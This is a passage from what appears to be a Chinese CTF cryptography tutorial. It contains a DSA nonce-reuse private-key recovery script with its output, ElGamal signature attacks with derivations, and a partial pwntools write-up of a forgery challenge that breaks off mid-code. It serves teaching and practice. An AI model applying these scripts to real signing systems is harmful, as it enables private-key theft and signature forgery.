ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11: 84 :be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38: 3c:b4:a9:54:b3:7c:b5:88:67:2f:7c:09:57:b6:fd: f2:fa:05:38:fd:ad:83:93:4a:45:e4:f9:9d:38:de: 57 :c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1: 0c:e7:57:68:90:b6:ba:08:9b Q: 00 :86:8f:78:b8:c8:50:0b:eb:f6:7a:58:e3:3c:1f: 53 :9d:35:70:d1:bd G: 4c:d5:e6:b6:6a:6e:b7:e9:27:94:e3:61:1f:41:53: cb:11:af:5a:08:d9:d4:f8:a3:f2:50:03:72:91:ba: 5f:ff:3c:29:a8:c3:7b:c4:ee:5f:98:ec:17:f4:18: bc:71:61:01:6c:94:c8:49:02:e4:00:3a:79:87:f0: d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08: cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07: 9f:ea:12:09:8b:34:50:84:4a:2a:9e:5d:0a:99:bd: 86 :5e:05:70:d5:19:7d:f4:a1:c9:b8:01:8f:b9:9c: dc:e9:15:7b:98:50:01:79 \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e0a\u9762\u7684\u539f\u7406\u7f16\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u7a0b\u5e8f\u5982\u4e0b #coding=utf8 from Crypto.PublicKey import DSA from hashlib import sha1 import gmpy2 with open ( './dsa_public.pem' ) as f : key = DSA . importKey ( f ) y = key . y g = key . g p = key . p q = key . q f3 = open ( r \"packet3/message3\" , 'r' ) f4 = open ( r \"packet4/message4\" , 'r' ) data3 = f3 . read () data4 = f4 . read () sha = sha1 () sha . update ( data3 ) m3 = int ( sha . hexdigest (), 16 ) sha = sha1 () sha . update ( data4 ) m4 = int ( sha . hexdigest (), 16 ) print m3 , m4 s3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677D s4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123 r = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC ds = s4 - s3 dm = m4 - m3 k = gmpy2 . mul ( dm , gmpy2 . invert ( ds , q )) k = gmpy2 . f_mod ( k , q ) tmp = gmpy2 . mul ( k , s3 ) - m3 x = tmp * gmpy2 . invert ( r , q ) x = gmpy2 . f_mod ( x , q ) print int ( x ) \u6211\u53d1\u73b0pip\u5b89\u88c5\u7684pycrypto\u7adf\u7136\u6ca1\u6709DSA\u7684importKey\u51fd\u6570\u3002\u3002\u3002\u53ea\u597d\u4ecegithub\u4e0a\u4e0b\u8f7d\u5b89\u88c5\u4e86pycrypto\u3002\u3002\u3002 \u7ed3\u679c\u5982\u4e0b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 python exp.py 1104884177962524221174509726811256177146235961550 943735132044536149000710760545778628181961840230 520793588153805320783422521615148687785086070744","title":"\u4f8b\u5b50"},{"location":"crypto/signature/elgamal/","text":"ElGamal \u00b6 RSA\u7684\u6570\u5b57\u7b7e\u540d\u65b9\u6848\u51e0\u4e4e\u4e0e\u5176\u52a0\u5bc6\u65b9\u6848\u5b8c\u5168\u4e00\u81f4\uff0c\u53ea\u662f\u5229\u7528\u79c1\u94a5\u8fdb\u884c\u4e86\u7b7e\u540d\u3002\u4f46\u662f\uff0c\u5bf9\u4e8eElGamal\u6765\u8bf4\uff0c\u5176\u7b7e\u540d\u65b9\u6848\u4e0e\u76f8\u5e94\u7684\u52a0\u5bc6\u65b9\u6848\u5177\u6709\u5f88\u5927\u533a\u522b\u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u5bc6\u94a5\u751f\u6210 \u00b6 \u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff08\u5341\u8fdb\u5236\u4f4d\u6570\u4e0d\u4f4e\u4e8e160\uff09\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002 \u9009\u53d6 Z_p^* Z_p^* \u7684\u751f\u6210\u5143g\u3002 \u968f\u673a\u9009\u53d6\u6574\u6570d, 0\\leq d \\leq p-2 0\\leq d \\leq p-2 \uff0c\u5e76\u8ba1\u7b97 g^d \\equiv y \\bmod p g^d \\equiv y \\bmod p \u3002 \u5176\u4e2d\u79c1\u94a5\u4e3a{d}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002 \u7b7e\u540d \u00b6 A\u9009\u53d6\u968f\u673a\u6570 k \\in Z_{p-1} k \\in Z_{p-1} \uff0c\u5e76\u4e14 gcd(k,p-1)=1 gcd(k,p-1)=1 \uff0c\u5bf9\u6d88\u606f\u8fdb\u884c\u7b7e\u540d sig_d(m,k)=(r,s) sig_d(m,k)=(r,s) \u5176\u4e2d r \\equiv g^k \\bmod p r \\equiv g^k \\bmod p \uff0c s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1 \u3002 \u9a8c\u8bc1 \u00b6 \u5982\u679c g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p \uff0c\u90a3\u4e48\u9a8c\u8bc1\u6210\u529f\uff0c\u5426\u5219\u9a8c\u8bc1\u5931\u8d25\u3002\u8fd9\u91cc\u9a8c\u8bc1\u6210\u529f\u7684\u539f\u7406\u5982\u4e0b\uff0c\u9996\u5148\u6211\u4eec\u6709 y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks} y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks} \u53c8\u56e0\u4e3a s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1 \u6240\u4ee5 ks \\equiv m-dr \\bmod p-1 ks \\equiv m-dr \\bmod p-1 \u8fdb\u800c ks+dr=a*(p-1)+m ks+dr=a*(p-1)+m \u6240\u4ee5 g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m \u6240\u4ee5\u6839\u636e\u8d39\u9a6c\u5b9a\u7406\uff0c\u53ef\u5f97 g^{ks+dr} \\equiv g^m \\bmod p g^{ks+dr} \\equiv g^m \\bmod p \u5e38\u89c1\u653b\u51fb \u00b6 \u5b8c\u5168\u7834\u8bd1\u653b\u51fb \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 p\u592a\u5c0f\u6216\u65e0\u5927\u7d20\u56e0\u5b50 \u5982\u679c p p \u592a\u5c0f\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7528\u5927\u90e8\u5c0f\u6b65\u7b97\u6cd5\u5206\u89e3, \u6216\u8005\u5982\u679c\u5176\u65e0\u5927\u7684\u7d20\u56e0\u5b50, \u6211\u4eec\u53ef\u4ee5\u91c7\u7528 Pohling\\: Hellman Pohling\\: Hellman \u7b97\u6cd5\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u5373\u53ef\u8fdb\u800c\u6c42\u51fa\u79c1\u94a5\u3002 \u968f\u673a\u6570k\u590d\u7528 \u5982\u679c\u7b7e\u540d\u8005\u590d\u7528\u4e86\u968f\u673a\u6570k\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u5730\u8ba1\u7b97\u51fa\u79c1\u94a5\u3002\u5177\u4f53\u7684\u539f\u7406\u5982\u4e0b\uff1a \u5047\u8bbe\u76ee\u524d\u6709\u4e24\u4e2a\u7b7e\u540d\u90fd\u662f\u4f7f\u7528\u540c\u4e00\u4e2a\u968f\u673a\u6570\u8fdb\u884c\u7b7e\u540d\u7684\u3002\u90a3\u4e48\u6211\u4eec\u6709 r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1 r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1 \u8fdb\u800c\u6709 s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1 s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1 \u4e24\u5f0f\u76f8\u51cf k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1 k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1 \u8fd9\u91cc\uff0c s_1,s_2,m_1,m_2,p-1 s_1,s_2,m_1,m_2,p-1 \u5747\u5df2\u77e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7b97\u51fak\u3002\u5f53\u7136\uff0c\u5982\u679c gcd(s_1-s_2,p-1)!=1 gcd(s_1-s_2,p-1)!=1 \u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u591a\u4e2a\u89e3\uff0c\u8fd9\u65f6\u6211\u4eec\u53ea\u9700\u8981\u591a\u8bd5\u4e00\u8bd5\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636es\u7684\u8ba1\u7b97\u65b9\u6cd5\u5f97\u5230\u79c1\u94a5d\uff0c\u5982\u4e0b d \\equiv \\frac{m-ks}{r} d \\equiv \\frac{m-ks}{r} \u9898\u76ee \u00b6 2016 LCTF Crypto 450 \u901a\u7528\u4f2a\u9020\u7b7e\u540d \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5982\u679c\u6d88\u606f m m \u6ca1\u6709\u53d6\u54c8\u5e0c\uff0c\u6216\u8005\u6d88\u606f m m \u6ca1\u6709\u6307\u5b9a\u6d88\u606f\u683c\u5f0f\u7684\u60c5\u51b5\u4e0b\u653b\u51fb\u6210\u7acb\u3002 \u539f\u7406 \u00b6 \u5728\u653b\u51fb\u8005\u77e5\u9053\u4e86\u67d0\u4e2a\u4ebaAlice\u7684\u516c\u94a5\u4e4b\u540e\uff0c\u4ed6\u53ef\u4ee5\u4f2a\u9020Alice\u7684\u7b7e\u540d\u4fe1\u606f\u3002\u5177\u4f53\u539f\u7406\u5982\u4e0b: \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\uff0cAlice\u7684\u516c\u94a5\u4e3a{p,g,y}\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4f2a\u9020 \u9009\u62e9\u6574\u6570 i i \uff0c j j \uff0c\u5176\u4e2d gcd(j,p-1)=1 gcd(j,p-1)=1 \u8ba1\u7b97\u7b7e\u540d\uff0c r \\equiv g^iy^j \\bmod p r \\equiv g^iy^j \\bmod p \uff0c s\\equiv -rj^{-1} \\bmod p-1 s\\equiv -rj^{-1} \\bmod p-1 \u8ba1\u7b97\u6d88\u606f\uff0c m\\equiv si \\bmod p-1 m\\equiv si \\bmod p-1 \u90a3\u4e48\u6b64\u65f6\u751f\u6210\u7684\u7b7e\u540d\u4e0e\u6d88\u606f\u5c31\u662f\u53ef\u4ee5\u88ab\u6b63\u5e38\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5177\u4f53\u63a8\u5bfc\u5982\u4e0b: y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p \u53c8\u7531\u4e8e\u6d88\u606fm\u7684\u6784\u9020\u65b9\u5f0f\uff0c\u6240\u4ee5 g^{si} \\equiv g^m \\bmod p-1 g^{si} \\equiv g^m \\bmod p-1 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\u7684\u6d88\u606f\uff0c\u4f46\u662f\u4ed6\u5374\u65e0\u6cd5\u4f2a\u9020\u6307\u5b9a\u683c\u5f0f\u7684\u6d88\u606f\u3002\u800c\u4e14\uff0c\u4e00\u65e6\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u64cd\u4f5c\uff0c\u8fd9\u4e00\u653b\u51fb\u5c31\u4e0d\u518d\u53ef\u884c\u3002 \u5df2\u77e5\u7b7e\u540d\u4f2a\u9020 \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053 (r, s) (r, s) \u662f\u6d88\u606f M M \u7684\u7b7e\u540d\uff0c\u5219\u653b\u51fb\u8005\u53ef\u5229\u7528\u5b83\u6765\u4f2a\u9020\u5176\u5b83\u6d88\u606f\u7684\u7b7e\u540d\u3002 \u539f\u7406 \u00b6 \u9009\u62e9\u6574\u6570 h, i, j \\in[0, p-2] h, i, j \\in[0, p-2] \u4e14\u6ee1\u8db3 \\operatorname{gcd}(h r-j s, \\varphi(p))=1 \\operatorname{gcd}(h r-j s, \\varphi(p))=1 \u8ba1\u7b97\u4e0b\u5f0f \\begin{array}{l} r^{\\prime}=r^{h} \\alpha^{i} y_{A}^{j} \\bmod p \\\\ s^{\\prime}=\\operatorname{sr}(h r-j s)^{-1} \\bmod \\varphi(p) \\\\ m^{\\prime}=r^{\\prime}(h m+i s)(h r-j s)^{-1} \\bmod \\varphi(p) \\end{array} \\begin{array}{l} r^{\\prime}=r^{h} \\alpha^{i} y_{A}^{j} \\bmod p \\\\ s^{\\prime}=\\operatorname{sr}(h r-j s)^{-1} \\bmod \\varphi(p) \\\\ m^{\\prime}=r^{\\prime}(h m+i s)(h r-j s)^{-1} \\bmod \\varphi(p) \\end{array} \u53ef\u5f97\u5230 (r',s') (r',s') \u662f m' m' \u7684\u6709\u6548\u7b7e\u540d \u8bc1\u660e\u5982\u4e0b: \u5df2\u77e5Alice\u5bf9\u6d88\u606f x x \u7684\u7b7e\u540d (\\gamma,\\delta) (\\gamma,\\delta) \u6ee1\u8db3 \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \uff0c\u6240\u4ee5\u6211\u4eec\u76ee\u7684\u4e3a\u6784\u9020\u51fa \\left(x^{\\prime}, \\lambda, \\mu\\right) \\left(x^{\\prime}, \\lambda, \\mu\\right) \u6ee1\u8db3 \\beta^{\\lambda} \\lambda^{\\mu} \\equiv \\alpha^{x'}(\\bmod p) \\beta^{\\lambda} \\lambda^{\\mu} \\equiv \\alpha^{x'}(\\bmod p) \u90a3\u4e48\uff0c\u9996\u5148\u6211\u4eec\u628a \\lambda \\lambda \u8868\u793a\u4e3a\u4e09\u4e2a\u5df2\u77e5\u5e95 \\alpha, \\beta, \\gamma \\alpha, \\beta, \\gamma \u7684\u5f62\u5f0f: \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p ,\u7531\u6761\u4ef6\u53ef\u5f97 \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \\Leftrightarrow \\gamma=\\left(\\beta^{-\\gamma} \\alpha^{x}\\right)^{\\delta-1} \\bmod p \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \\Leftrightarrow \\gamma=\\left(\\beta^{-\\gamma} \\alpha^{x}\\right)^{\\delta-1} \\bmod p \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5f97\u5230 \\lambda=\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h} \\bmod p \\lambda=\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h} \\bmod p \u6211\u4eec\u628a \\lambda \\lambda \u7684\u8868\u8fbe\u5f0f\u4ee3\u5165\u4e00\u5f0f\u4e2d \\begin{aligned}& \\beta^{\\lambda}\\left(\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h}\\right)^{\\mu} \\equiv \\alpha^{x^{\\prime}}(\\bmod p) \\\\\\Leftrightarrow & \\beta^{\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu} \\equiv \\alpha^{x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu}(\\bmod p)\\end{aligned} \\begin{aligned}& \\beta^{\\lambda}\\left(\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h}\\right)^{\\mu} \\equiv \\alpha^{x^{\\prime}}(\\bmod p) \\\\\\Leftrightarrow & \\beta^{\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu} \\equiv \\alpha^{x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu}(\\bmod p)\\end{aligned} \u6211\u4eec\u4ee4\u4e24\u8fb9\u6307\u6570\u4e3a 0 0 , \u5373 \\left\\{\\begin{matrix}\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\\\ x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\end{matrix}\\right. \\left\\{\\begin{matrix}\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\\\ x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\end{matrix}\\right. \u53ef\u4ee5\u5f97\u5230 \\mu=\\delta \\lambda(h \\gamma-j \\delta)^{-1} \\quad(\\bmod p-1) \\\\ x^{\\prime}=\\lambda(h x+i \\delta)(h \\gamma-j \\delta)^{-1}(\\bmod p-1) \\mu=\\delta \\lambda(h \\gamma-j \\delta)^{-1} \\quad(\\bmod p-1) \\\\ x^{\\prime}=\\lambda(h x+i \\delta)(h \\gamma-j \\delta)^{-1}(\\bmod p-1) \u5176\u4e2d \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p \u6240\u4ee5\u6211\u4eec\u5f97\u5230 (\\lambda, \\mu) (\\lambda, \\mu) \u662f x' x' \u7684\u6709\u6548\u7b7e\u540d\u3002 \u6b64\u5916,\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9CRT\u6784\u9020 m' m' , \u539f\u7406\u5982\u4e0b: u=m^{\\prime} m^{-1} \\bmod \\varphi(p), \\quad s^{\\prime}=s u \\bmod \\varphi(p) u=m^{\\prime} m^{-1} \\bmod \\varphi(p), \\quad s^{\\prime}=s u \\bmod \\varphi(p) \u518d\u8ba1\u7b97 r^{\\prime}, \\quad r^{\\prime} \\equiv r u \\bmod \\varphi(p), r^{\\prime} \\equiv r \\bmod p r^{\\prime}, \\quad r^{\\prime} \\equiv r u \\bmod \\varphi(p), r^{\\prime} \\equiv r \\bmod p \u663e\u7136\u53ef\u4ee5\u4f7f\u7528CRT\u6c42\u89e3 r' r' , \u6ce8\u610f\u5230 y_{A}^{r'} r'^{s^{\\prime}}=y_{A}^{ru} r^{s u}=\\left(y_{A}^{r} r^{s}\\right)^{u}=\\alpha^{m u} \\equiv \\alpha^{m} \\bmod p y_{A}^{r'} r'^{s^{\\prime}}=y_{A}^{ru} r^{s u}=\\left(y_{A}^{r} r^{s}\\right)^{u}=\\alpha^{m u} \\equiv \\alpha^{m} \\bmod p \u6240\u4ee5 (r',s') (r',s') \u662f\u6d88\u606f m' m' \u7684\u6709\u6548\u7b7e\u540d\u3002 \u62b5\u6297\u63aa\u65bd:\u5728\u9a8c\u8bc1\u7b7e\u540d\u65f6, \u68c0\u67e5 r < p r < p \u3002 \u9009\u62e9\u7b7e\u540d\u4f2a\u9020 \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u6211\u4eec\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f97\u5230\u7b7e\u540d\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u65b0\u7684\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u591f\u9009\u62e9\u7b7e\u540d\u7684\u6d88\u606f\u4f2a\u9020\u7b7e\u540d\u3002 \u539f\u7406 \u00b6 \u6211\u4eec\u77e5\u9053\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u5982\u4e0b g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p \u90a3\u4e48\u53ea\u8981\u6211\u4eec\u9009\u62e9\u4e00\u4e2a\u6d88\u606fm\u4f7f\u5176\u548c\u6211\u4eec\u6240\u8981\u4f2a\u9020\u7684\u6d88\u606f m' m' \u6a21p-1\u540c\u4f59\uff0c\u7136\u540e\u540c\u65f6\u4f7f\u7528\u6d88\u606fm\u7684\u7b7e\u540d\u5373\u53ef\u7ed5\u8fc7\u3002 \u9898\u76ee \u00b6 \u8fd9\u91cc\u4ee52017\u5e74\u56fd\u8d5bmailbox\u4e3a\u4f8b\uff0c i\u6625\u79cb\u6709\u590d\u73b0 \u3002 \u9996\u5148\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u8fdb\u884cproof of work proof = b64 . b64encode ( os . urandom ( 12 )) req . sendall ( \"Please provide your proof of work, a sha1 sum ending in 16 bit's set to 0, it must be of length %d bytes, starting with %s \\n \" % ( len ( proof ) + 5 , proof )) test = req . recv ( 21 ) ha = hashlib . sha1 () ha . update ( test ) if ( test [ 0 : 16 ] != proof or ord ( ha . digest ()[ - 1 ]) != 0 or ord ( ha . digest ()[ - 2 ]) != 0 ): # or ord(ha.digest()[-3]) != 0 or ord(ha.digest()[-4]) != 0): req . sendall ( \"Check failed\" ) req . close () return \u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u4ee5proof\u5f00\u5934\u7684\u957f\u5ea6\u4e3aproof\u957f\u5ea6\u52a05\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5176sha1\u7684\u503c\u4ee516\u6bd4\u7279\u76840\u7ed3\u675f\u3002 \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7\u3002 def f ( x ): return sha1 ( prefix + x ) . digest ()[ - 2 :] == ' \\0\\0 ' sh = remote ( '106.75.66.195' , 40001 ) # bypass proof sh . recvuntil ( 'starting with ' ) prefix = sh . recvuntil ( ' \\n ' , drop = True ) print string . ascii_letters s = util . iters . mbruteforce ( f , string . ascii_letters + string . digits , 5 , 'fixed' ) test = prefix + s sh . sendline ( test ) \u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\u4e2d\u7684util.iters.mbruteforce\uff0c\u8fd9\u662f\u4e00\u4e2a\u5229\u7528\u7ed9\u5b9a\u5b57\u7b26\u96c6\u5408\u4ee5\u53ca\u6307\u5b9a\u957f\u5ea6\u8fdb\u884c\u591a\u7ebf\u7a0b\u7206\u7834\u7684\u51fd\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7206\u7834\u51fd\u6570\uff0c\u8fd9\u91cc\u662fsha1\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u96c6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u8282\u6570\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u6307\u7684\u662f\u6211\u4eec\u53ea\u5c1d\u8bd5\u5b57\u8282\u6570\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u5b57\u8282\u6570\u7684\u6392\u5217\uff0c\u5373\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\u3002\u66f4\u52a0\u5177\u4f53\u7684\u4fe1\u606f\u8bf7\u53c2\u8003pwntools\u3002 \u7ed5\u8fc7\u4e4b\u540e\uff0c\u6211\u4eec\u7ee7\u7eed\u5206\u6790\u7a0b\u5e8f\uff0c\u7b80\u5355\u770b\u4e0bgenerate_keys\u51fd\u6570\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u51fd\u6570\u662fElGamal\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u770b\u4e86\u770bverify\u51fd\u6570\uff0c\u5c31\u662f\u9a8c\u8bc1\u7b7e\u540d\u7684\u8fc7\u7a0b\u3002 \u7ee7\u7eed\u5206\u6790 if len ( msg ) > MSGLENGTH : req . sendall ( \"what r u do'in?\" ) req . close () return if msg [: 4 ] == \"test\" : r , s = sign ( digitalize ( msg ), sk , pk , p , g ) req . sendall ( \"Your signature is\" + repr (( hex ( r ), hex ( s ))) + \" \\n \" ) else : if msg == \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test : req . sendall ( \"Signature:\" ) sig = self . rfile . readline () . strip () if len ( sig ) > MSGLENGTH : req . sendall ( \"what r u do'in?\" ) req . close () return sig_rs = sig . split ( \",\" ) if len ( sig_rs ) < 2 : req . sendall ( \"yo what?\" ) req . close () return # print \"Got sig\", sig_rs if verify ( digitalize ( msg ), int ( sig_rs [ 0 ]), int ( sig_rs [ 1 ]), pk , p , g ): req . sendall ( \"Login Success. \\n Dr. Ziegler has a message for you: \" + FLAG ) print \"shipped flag\" req . close () return else : req . sendall ( \"You are not the Genji I knew! \\n \" ) \u6839\u636e\u8fd9\u4e09\u4e2aif\u6761\u4ef6\u53ef\u4ee5\u77e5\u9053 \u6211\u4eec\u7684\u6d88\u606f\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7MSGLENGTH\uff0c40000\u3002 \u6211\u4eec\u53ef\u4ee5\u5bf9\u6d88\u606f\u5f00\u5934\u4e3atest\u7684\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\u3002 \u6211\u4eec\u9700\u8981\u4f7f\u5f97\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\uff0c\u4ee5\u6211\u4eec\u7ed5\u8fc7proof\u7684test\u4e3a\u7ed3\u5c3e\u7684\u6d88\u606f\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u63d0\u4f9b\u7b7e\u540d\u7684\u503c\u3002 \u5206\u6790\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5c31\u77e5\u9053\u4e86\uff0c\u6211\u4eec\u5c31\u662f\u5728\u9009\u62e9\u6307\u5b9a\u7b7e\u540d\u8fdb\u884c\u4f2a\u9020\uff0c\u8fd9\u91cc\u6211\u4eec\u81ea\u7136\u8981\u5145\u5206\u5229\u7528\u7b2c\u4e8c\u4e2aif\u6761\u4ef6\uff0c\u53ea\u8981\u6211\u4eec\u786e\u4fdd\u6211\u4eec\u8f93\u5165\u7684\u6d88\u606f\u7684\u5f00\u5934\u4e3a\u2018test\u2019\uff0c\u5e76\u4e14\u8be5\u6d88\u606f\u4e0e\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u6a21p-1\u540c\u4f59\uff0c\u6211\u4eec\u5373\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002 \u90a3\u6211\u4eec\u5982\u4f55\u6784\u9020\u5462\uff1f\u65e2\u7136\u6d88\u606f\u7684\u957f\u5ea6\u53ef\u4ee5\u8db3\u591f\u957f\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06'test'\u5bf9\u5e94\u768416\u8fdb\u5236\u5148\u5de6\u79fb\u5f97\u5230\u6bd4p-1\u5927\u7684\u6570\u5b57a\uff0c\u7136\u540e\u7528a\u5bf9p-1\u53d6\u6a21\uff0c\u7528a\u518d\u51cf\u53bb\u4f59\u6570\uff0c\u6b64\u65f6a\u6a21p-1\u4f590\u4e86\u3002\u8fd9\u65f6\u518d\u52a0\u4e0a\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u7684\u503c\uff0c\u5373\u5b9e\u73b0\u4e86\u6a21p-1\u540c\u4f59\u3002 \u5177\u4f53\u5982\u4e0b # construct the message begins with 'test' target = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) while 1 : tmp = hex ( victim )[ 2 :] . decode ( 'hex' ) if tmp . startswith ( 'test' ) and ' \\n ' not in tmp : break else : part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( 